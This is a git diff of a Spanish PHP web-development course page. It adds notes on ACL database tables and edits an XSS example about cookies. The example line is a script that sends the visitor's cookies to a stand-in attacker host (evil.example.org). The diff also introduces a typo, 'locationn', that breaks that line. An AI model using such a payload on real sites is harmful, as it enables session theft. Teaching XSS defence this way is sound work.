@@ -10,12 +10,21 @@ parent: Desarrollo Web en Entorno Servidor
 
 ## 3.1. Autenticación mediante ACL
 
-Casi todas las aplicaciones web incluyen un subsistema de autenticación de usuarios (ACL = Access Control Login).
+Casi todas las aplicaciones web incluyen un subsistema de autenticación de usuarios (ACL = Access Control List).
+
 Ese subsistema suele estar basado en este diseño de base de datos:
 
-XXX esquema
+![Tablas ACL](/assets/images/03-acl.jpg)
+
+Esto significa que necesitamos **cinco tablas** para implementar un ACL completo.
+
+Sin embargo, la mayor parte de las veces tendremos suficiente con solo tres tablas (usuarios, roles y usuarios-roles), o incluso solo con una (usuarios, añadiendo quizá un campo "tipo"). Optar por una solución más o menos compleja dependerá del tipos de sistema que estemos implementando.
+
+En cualquier caso, es conveniente que conozcas el esquema ACL completo (5 tablas) para que lo pongas en práctica cuando lo necesites.
 
 ## 3.2. Cookies
+
+XXX
 
 PHP soporta cookies HTTP de forma transparente. Las Cookies son un mecanismo por el cuál se almacenan datos en el navegador remoto y así rastrear o identificar a usuarios que vuelven, pero también puede utilizarse cualquier otro valor que deba permanecer de un script a otro. Se pueden configurar Cookies usando la función setcookie() o setrawcookie(). 
 
@@ -267,7 +276,7 @@ Las vulnerabilidades de XSS permiten ejecutar código de scripting en el context
 
 Un usuario que ejecute este código con JavaScript activado en su navegador será redireccionado a evil.example.org, y las cookies asociadas al sitio web serán incluidas en la consulta:
 
-<script>document.location = 'http://evil.example.org/steal_cookies.php?cookies=' + document.cookie</script>
+<script>document.locationn = 'http://evil.example.org/steal_cookies.php?cookies=' + document.cookie</script>
 
 Se recomienda:
 
